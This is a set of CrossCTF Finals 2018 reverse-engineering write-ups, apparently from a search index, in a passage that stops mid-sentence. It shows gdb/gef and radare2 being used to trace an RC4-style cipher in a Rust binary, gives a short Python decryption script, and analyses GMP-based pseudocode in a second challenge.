0x00007ffff7f7f291 in __libc_write (fd=0x1, buf=0x7ffff761c000, nbytes=0x57) at ../sysdeps/unix/sysv/linux/write.c:27 #1 0x0000555555560e9c in ?? () #2 0x0000555555562278 in ?? () #3 0x0000555555561568 in ?? () #4 0x000055555556a0f6 in ?? () #5 0x00005555555625db in ?? () #6 0x000055555556e696 in ?? () #7 0x000055555556eb43 in ?? () #8 0x000055555556ddb3 in ?? () #9 0x00007ffff7bbbb17 in __libc_start_main (main=0x55555556d7a0, argc=0x1, argv=0x7fffffffde68, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffde58) at ../csu/libc-start.c:310 #10 0x000055555555ac2a in ?? () No shortcuts here. We can start by looking at the function called after __libc_start_main , which is at #8. Because the addresses here are added with a base address, we can use vmmap to get the base address, which is 0x0000555555554000 . Subtracting it from the address at #8, we can inspect it in r2, at address 0x19db3 . We see that before this instruction, call fcn.000079b0 was being executed, so #7 is an address inside fcn.000079b0 . Let's try to set a breakpoint at 0x19dae and see if we can find the jmp [rsi+0x18] instruction from here. Since the binary is a PIE, we can't set the breakpoint at 0x19dae using break *0x19dae , since during execution there will be a base address added to it as seen earlier, and 0x19dae will become an invalid address. To do this, we can use pie break *0x19dae from gef, and pie run to run it with these settings. Great! jmp [rsi+0x18] is close to us. Single stepping a few steps, we arrive at call [rdi] , which brings us into the actual program main , which is at 0x55555556dff0 , without the base address it is 0x19ff0 .","title":"Using backtrace"},{"location":"crossctf-finals2018/re/iamrusty/#define-function-in-r2","text":"Now we are left with defining 0x19ff0 as a function in r2, and renaming it to actual_main . We can do this by seeking 0x19ff0 using s 0x19ff0 , then entering visual mode using V , and pressing df to define function, lastly dr to rename function. Once we are done with this, we can open up the graph view and actually start to reverse what the binary is doing.","title":"Define function in r2"},{"location":"crossctf-finals2018/re/iamrusty/#rust-main-break","text":"Since I do not want to do this kind of searching all the time, I wrote a command for gef-extras that automates this process. It will look like something like the following gef\u27a4 rust-main-break [+] Breaking at '{<text variable, no debug info>} 0x5570 <__libc_start_main@plt>' [Thread debugging using libthread_db enabled] Using host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\". [+] Searching for 'jmp QWORD PTR [rsi + 0x18]' instructions [+] Trying 0x55555555b9b5 [Thread debugging using libthread_db enabled] Using host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\". 0x000055555556eb40 in ?? () 0x000055555556eb41 in ?? () \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ registers ]\u2500\u2500\u2500\u2500 $rax : 0x0 $rbx : 0x5555557bb2c8 \u2192 0x0000000000000000 $rcx : 0x0 $rdx : 0x5555557bb2c8 \u2192 0x0000000000000000 $rsp : 0x7fffffffdc28 \u2192 0x000055555556eb43 \u2192 xor eax, eax $rbp : 0x7ffff7625000 \u2192 0x0000000000000001 $rsi : 0x5555557baae8 \u2192 0x000055555556eb30 \u2192 ret $rdi : 0x7fffffffdcb8 \u2192 0x000055555556dff0 \u2192 push r14 $rip : 0x55555556dff0 \u2192 push r14 $r8 : 0x0 $r9 : 0x800000000 $r10 : 0xf $r11 : 0x7ffff7fe7990 \u2192 <_dl_find_dso_for_object+0> push r13 $r12 : 0x7fffff7fe000 $r13 : 0x1 $r14 : 0x7fffffffdc40 \u2192 0x0000000000000001 $r15 : 0x7fffff7ff000 $eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification] $fs: 0x0000 $gs: 0x0000 $es: 0x0000 $ds: 0x0000 $cs: 0x0033 $ss: 0x002b \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 0x00007fffffffdc28\u2502+0x00: 0x000055555556eb43 \u2192 xor eax, eax \u2190 $rsp 0x00007fffffffdc30\u2502+0x08: 0x0000000000000000 0x00007fffffffdc38\u2502+0x10: 0x000055555556ddb3 \u2192 mov ebx, eax 0x00007fffffffdc40\u2502+0x18: 0x0000000000000001 \u2190 $r14 0x00007fffffffdc48\u2502+0x20: 0x00007fffff7fe000 0x00007fffffffdc50\u2502+0x28: 0x00007fffff7ff000 0x00007fffffffdc58\u2502+0x30: 0x00007ffff7625000 \u2192 0x0000000000000001 0x00007fffffffdc60\u2502+0x38: 0x00007fffffffde78 \u2192 0x00007fffffffe205 \u2192 \"XDG_RUNTIME_DIR=/run/user/1000\" \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386:x86-64 ]\u2500\u2500\u2500\u2500 0x55555556dfe0 ud2 0x55555556dfe2 nop WORD PTR cs:[rax+rax*1+0x0] 0x55555556dfec nop DWORD PTR [rax+0x0] \u2192 0x55555556dff0 push r14 0x55555556dff2 push rbx 0x55555556dff3 sub rsp, 0x298 0x55555556dffa lea rdi, [rsp+0x180] 0x55555556e002 xor ebx, ebx 0x55555556e004 xor esi, esi \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ threads ]\u2500\u2500\u2500\u2500 [#0] Id 1, Name: \"unpacked\", stopped, reason: SINGLE STEP \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ]\u2500\u2500\u2500\u2500 [#0] 0x55555556dff0 \u2192 push r14 [#1] 0x55555556eb43 \u2192 xor eax, eax [#2] 0x55555556ddb3 \u2192 mov ebx, eax [#3] 0x7ffff7bbbb17 \u2192 Name: __libc_start_main(main=0x55555556d7a0, argc=0x1, argv=0x7fffffffde68, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffde58) [#4] 0x55555555ac2a \u2192 hlt \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 0x000055555556dff0 in ?? () [+] Found 'main' at 0x55555556dff0","title":"rust-main-break"},{"location":"crossctf-finals2018/re/iamrusty/#reverse-encryption","text":"Now that we can analyse main , the next step is to reverse the encryption algorithm. At the start of the function, we see a few blocks of data are being copied to the stack. Inspecting those values, :> ps @ 0x545b0 \\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09 \\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~\\x7f\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff it looks like the initial permutation of RC4 . It's something important to keep in mind, but not to quickly jump to conclusions yet. (Actually, a hint was given that the encryption method is a variation of RC4)","title":"Reverse encryption"},{"location":"crossctf-finals2018/re/iamrusty/#output-tracing","text":"At this point, what I decided to do, was to try to trace the output of the program, to see what is being done to it, and where did it come from. Again, I made use of the backtrace. (For reference) gef\u27a4 bt #0 0x00007ffff7f7f291 in __libc_write (fd=0x1, buf=0x7ffff761c000, nbytes=0x57) at ../sysdeps/unix/sysv/linux/write.c:27 #1 0x0000555555560e9c in ?? () #2 0x0000555555562278 in ?? () #3 0x0000555555561568 in ?? () #4 0x000055555556a0f6 in ?? () #5 0x00005555555625db in ?? () #6 0x000055555556e696 in ?? () #7 0x000055555556eb43 in ?? () #8 0x000055555556ddb3 in ?? () #9 0x00007ffff7bbbb17 in __libc_start_main (main=0x55555556d7a0, argc=0x1, argv=0x7fffffffde68, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffde58) at ../csu/libc-start.c:310 #10 0x000055555555ac2a in ?? () This time, we want to find the address of the instruction in actual_main that calls a function that leads to printing the encrypted flag. After some checking, #6 is the one we are looking for. In particular, call fcn.0000e520 at 0x1a691 . Now, the question is, is fcn.0000e520 a printing function, or a function that further encrypts the flag then calls a printing function? To do this, we can inspect the registers and stack to see if we can find traces of the final encrypted flag. Let's set a breakpoint at 0x1a691 to inspect the stack before fcn.0000e520 is called. Looking at the registers, we see some optimistic results. In particular, rdx contains an address that leads to the string \"The encrypted flag is\" . $rax : 0x7fffffffdad8 \u2192 0x00007fffffffdae8 \u2192 0x00007ffff762a000 \u2192 0x86b1fb0b226031d5 $rbx : 0x7ffff7625050 \u2192 0x0000000000000002 $rcx : 0x0 $rdx : 0x7fffffffdb00 \u2192 0x00005555557baac8 \u2192 0x00005555555aa900 \u2192 \"The encrypted flag is \\n/proc/curproc/file\" $rsp : 0x7fffffffd980 \u2192 \"6999 557bc000 rw-p 00\" $rbp : 0x7ffff7625000 \u2192 0x0000000000000001 $rsi : 0x7fffffffd9b0 \u2192 0x00007ffff7625050 \u2192 0x0000000000000002 $rdi : 0x7fffffffd990 \u2192 \"557bc000 rw-p 00\" $rip : 0x55555556e691 \u2192 call 0x555555562520 $r8 : 0x0 $r9 : 0x61 $r10 : 0x310 $r11 : 0xcc $r12 : 0x7fffff7fe000 $r13 : 0x1 $r14 : 0x7fffffffdc40 \u2192 0x0000000000000001 $r15 : 0x7fffff7ff000 $eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification] $fs: 0x0000 $gs: 0x0000 $es: 0x0000 $ds: 0x0000 $cs: 0x0033 $ss: 0x002b It seems like the address contained in rdx may contain our encrypted flag. Using telescope from gef, we can easily inspect the contents in the address contained by rdx . gef\u27a4 telescope $rdx 0x00007fffffffdb00\u2502+0x00: 0x00005555557baac8 \u2192 0x00005555555aa900 \u2192 \"The encrypted flag is \\n/proc/curproc/file\" \u2190 $rdx 0x00007fffffffdb08\u2502+0x08: 0x0000000000000002 0x00007fffffffdb10\u2502+0x10: 0x00005555555aa8c0 \u2192 add DWORD PTR [rax], eax 0x00007fffffffdb18\u2502+0x18: 0x0000000000000001 0x00007fffffffdb20\u2502+0x20: 0x00007fffffffdad8 \u2192 0x00007fffffffdae8 \u2192 0x00007ffff762a000 \u2192 0x86b1fb0b226031d5 0x00007fffffffdb28\u2502+0x28: 0x0000000000000001 0x00007fffffffdb30\u2502+0x30: 0x8754a2a1c8a40fb0 0x00007fffffffdb38\u2502+0x38: 0x573deb40f0ec6a78 0x00007fffffffdb40\u2502+0x40: 0x05bb44d0048dce4d 0x00007fffffffdb48\u2502+0x48: 0xc9343efffc4b7fed We see some numbers at $rdx + 0x30 . Let's check the decimal values of some bytes in there. gef\u27a4 x/10db $rdx+0x30 0x7fffffffdb30: -80 15 -92 -56 -95 -94 84 -121 0x7fffffffdb38: 120 106 gef\u27a4 x/10ub $rdx+0x30 0x7fffffffdb30: 176 15 164 200 161 162 84 135 0x7fffffffdb38: 120 106 Our program output is $ ./unpacked The encrypted flag is [213, 49, 96, 34, 11, 251, 177, 134, 203, 44, 118, 96, 155, 172] Sadly, those numbers do not match our program output. However, making some observations, we see that there is another set of possible numbers contained in the address at $rdx + 0x20 . gef\u27a4 x/10ub 0x00007ffff762a000 0x7ffff762a000: 213 49 96 34 11 251 177 134 0x7ffff762a008: 203 44 It matches! Our encrypted flag is contained in 0x00007ffff762a000 !","title":"Output tracing"},{"location":"crossctf-finals2018/re/iamrusty/#identify-relevant-code-blocks","text":"We are very close! Now, we can follow on by checking which part of the code affects this block of memory , then from there reverse the encryption algorithm. Typically in Rust binaries, there are a lot of functions that call pthread functions within them. Normally, we can ignore these functions as they are just used by Rust for things like safety checking or error handling. There are several ways we can identify the code blocks that are relevant. We can instrument the binary to stop when the contents in that memory block matches the encrypted flag. This can be done using tools like angr or GDB scripting. I chose to just manually set some breakpoints and check by hand. Doing so, I managed to identify that the blocks that matter in the CFG are If we look at the Wikipedia entry of RC4, the first block prepares the initial permutation. The second block is the KSA (Key scheduling algorithm). The third block performs some form of malloc-like operation that returns the address of the block containing our encrypted flag. The final block is the PRGA (pseudo-random generation algorithm) part. Looking at the PRGA block, we see occurences of xor instructions. This should be the flag, being encrypted by the output of the PRGA. If we piece them together, we get the string WhatIsTheFlag? .","title":"Identify relevant code blocks"},{"location":"crossctf-finals2018/re/iamrusty/#conclusion","text":"We are done with reversing. This binary shows us the encryption method used to encrypt the string WhatIsTheFlag? . Now we need to decrypt the actual flag given [193, 43, 110, 37, 49, 203, 177, 168, 213, 56, 111, 114, 136, 234, 91, 129, 74, 3, 134, 159, 134, 47, 53, 245, 103, 247, 251, 52, 198, 245, 208, 139, 188, 151, 208, 36, 109, 245, 48, 174, 123, 154] To sum up, the encryption algorithm is based on RC4, Sets up an initial permutation Swaps values in the initial permutation around for 256 iterations (Key scheduling) For each character in the flag, obtain a corresponding key byte after swapping some values in the permutation again (Pseudo-random generation), then xors it with the flag to produce the ciphertext","title":"Conclusion"},{"location":"crossctf-finals2018/re/iamrusty/#solution","text":"Now, we are left with writing a script to generate the keystream based on the one given in the binary, in order to decrypt the actual flag. Since the key scheduling part (block 2) is just setting up the permutation for the random number generation, we can let the program execute until that is done, then dump the memory containing the permutation to a file. Looking at the disassembly, we see that the key schedule is being stored in rsp + 0x182 . So, we can just set a breakpoint at the start of block 3 (i.e. when block 2 finishes), and then dump the contents in that memory block to a file. gef\u27a4 pie break *0x1a187 gef\u27a4 pie run gef\u27a4 dump memory key_schedule $rsp+0x182 $rsp+0x182+256 Then, we got to write a function to emulate the PRGA part. This part is just purely reversing the disassembly, nothing special. key_index = 0 key_index2 = 0 key_schedule = map(ord, list(open('key_schedule', 'r').read())) def get_key(): global key_index, key_index2, key_schedule key_index = (key_index + 1) % 256 key_index2 = (key_index2 + key_schedule[key_index]) % 256 key_schedule[key_index2], key_schedule[key_index] = key_schedule[key_index], key_schedule[key_index2] return key_schedule[(key_schedule[key_index] + key_schedule[key_index2]) % 256] And lastly, print the flag. if __name__ == '__main__': c = [193, 43, 110, 37, 49, 203, 177, 168, 213, 56, 111, 114, 136, 234, 91, 129, 74, 3, 134, 159, 134, 47, 53, 245, 103, 247, 251, 52, 198, 245, 208, 139, 188, 151, 208, 36, 109, 245, 48, 174, 123, 154] flag = '' for i in xrange(len(c)): flag += chr(c[i] ^ get_key()) print flag","title":"Solution"},{"location":"crossctf-finals2018/re/perfect/","text":"CrossCTF Finals 2018 : Perfect (re) 'Cause we lost it all Nothin' lasts forever Creator - amon (@nn_amon) Update: this definitely works with python 2.7.15 Challenge We were given a binary perfect . Opening it up in IDA gives us the following pseudocode. __int64 __fastcall main(__int64 a1, char **a2, char **a3) { __int64 v3; // rdx __int64 v4; // rdx __int64 v5; // rdx __int64 v6; // rdx char v8; // [rsp+10h] [rbp-460h] char v9; // [rsp+20h] [rbp-450h] int v10; // [rsp+24h] [rbp-44Ch] char v11; // [rsp+30h] [rbp-440h] int v12; // [rsp+34h] [rbp-43Ch] char v13; // [rsp+40h] [rbp-430h] char v14; // [rsp+50h] [rbp-420h] char v15; // [rsp+60h] [rbp-410h] unsigned __int64 v16; // [rsp+468h] [rbp-8h] v16 = __readfsqword(0x28u); __gmpz_init(&v8); __gmpz_set_ui(&v8, 0LL); __gmpz_init(&v9); __gmpz_set_ui(&v9, 0LL); __gmpz_init(&v11); __gmpz_set_ui(&v11, 0LL); __gmpz_init(&v13); __gmpz_set_ui(&v13, 0LL); __gmpz_init(&v14); __gmpz_set_ui(&v14, 2LL); __gmpz_mul_2exp(&v14, &v14, 212LL); printf(\"Eschucha? \", &v14); __isoc99_scanf(\"%1023s\", &v15); if ( (unsigned int)__gmpz_set_str(&v11, &v15, 10LL) ) __assert_fail(\"flag == 0\", \"perfect.c\", 0x20u, \"main\"); __gmpz_sub_ui(&v11, &v11, 1LL); if ( (unsigned int)__gmpz_set_str(&v13, &v15, 10LL) ) __assert_fail(\"flag == 0\", \"perfect.c\", 0x23u, \"main\"); while ( v12 < 0 || v12 > 0 ) { __gmpz_mod(&v9, &v13, &v11); if ( v10 >= 0 && v10 <= 0 ) __gmpz_add((__int64)&v8, (__int64)&v8, (__int64)&v11); __gmpz_sub_ui(&v11, &v11, 1LL); } if ( !(unsigned int)__gmpz_cmp(&v13, &v8) && (signed int)__gmpz_cmp(&v13, &v14) > 0 ) { printf(\"random.seed(\"); __gmpz_out_str(_bss_start, 10LL, &v8); puts(\")\"); puts(\"k = \\\"\\\".join([chr(random.randint(0, 255)) for i in range(35)])\"); puts(\"xor(k, 754e26ccd4b1bfafb3ffbdaa748780b7f0e0c3ae9acc3c008670f0fafd34f8ffa596db)\"); } __gmpz_clear((__int64)&v8); __gmpz_clear((__int64)&v13); __gmpz_clear((__int64)&v11); __gmpz_clear((__int64)&v9); __gmpz_clear((__int64)&v14); return 0LL; } mpz API Before continuing, we need to know what does the _gmpz_xxx functions do. Referring to the gmplib manual , we get that __gmpz_init initializes an address to be a mpz object. __gmpz_set_ui sets a mpz object with an unsigned int provided as the 2nd argument. __gmpz_mul_2exp left shifts the 2nd argument by the 3rd argument and stores the result in the 1st argument. __gmpz_add stores the sum of the 2nd argument and the 3rd argument in the 1st argument. __gmpz_sub_ui subtracts the 2nd argument by the 3rd argument and stores the result in the 1st argument. __gmpz_set_str takes the string in the 2nd argument and stores it in the 1st argument, with the 3rd argument being the base. __gmpz_out_str outputs the value of the 3rd argument, with the 2nd argument as the base, and the 1st argument being the output stream. __gmpz_mod takes the result of 2nd argument modulo 3rd argument and stores it in the 1st argument. __gmpz_cmp compares the two arguments and returns a positive number if op1 > op2, zero if op1 = op2, negative number if op1 < op2. pseudocode So, we can simplify the code above further to be v8 = 0 v9 = 0 v11 = 0 v13 = 0 v14 = 2 << 212 scanf(\"%1023s\", &v15) v11 = int(v15) - 1 v13 = int(v15) while (v12 != 0) { v9 = v13 % v11 if (v10 == 0) v8 += v11 v11--; } if (v13 == v8 && v13 > v14) print \"random_seed(\" + v8 + \")\" puts(\"k = \\\"\\\".join([chr(random.randint(0, 255)) for i in range(35)])\"); puts(\"xor(k, 754e26ccd4b1bfafb3ffbdaa748780b7f0e0c3ae9acc3c008670f0fafd34f8ffa596db)\"); So, it looks like the program requests for a number, and does some computations and comparisons with it, and if it passes all checks it gives us a seed that can be used to generate the flag. Hmm, suddenly there's v12 and v10 which we did not initialize at the start. We need to know what they are since the whole control flow relies on them. Looking back at the top of our original pseudocode char v8; // [rsp+10h] [rbp-460h] char v9; // [rsp+20h] [rbp-450h] int v10; // [rsp+24h] [rbp-44Ch] char v11; // [rsp+30h] [rbp-440h] int v12; // [rsp+34h] [rbp-43Ch] char v13; // [rsp+40h] [rbp-430h] char v14; // [rsp+50h] [rbp-420h] char v15; // [rsp+60h] [rbp-410h] We see that each mpz value, v8 , v9 , v11 , v13 and v14 are 16 bytes away from each other on the stack. So they all probably are 16 bytes long. On the other hand, v10 points to the address at an offset of 4 bytes from the address of v9 , and same for v12 and v11 . mpz internals To confirm our doubts, we refer to the manual . We see that each mpz_t variable is a struct with the following fields. _mp_size The number of limbs, or the negative of that when representing a negative integer. Zero is represented by _mp_size set to zero, in which case the _mp_d data is unused. _mp_d A pointer to an array of limbs which is the magnitude. These are stored \u201clittle endian\u201d as per the mpn functions, so _mp_d[0] is the least significant limb and 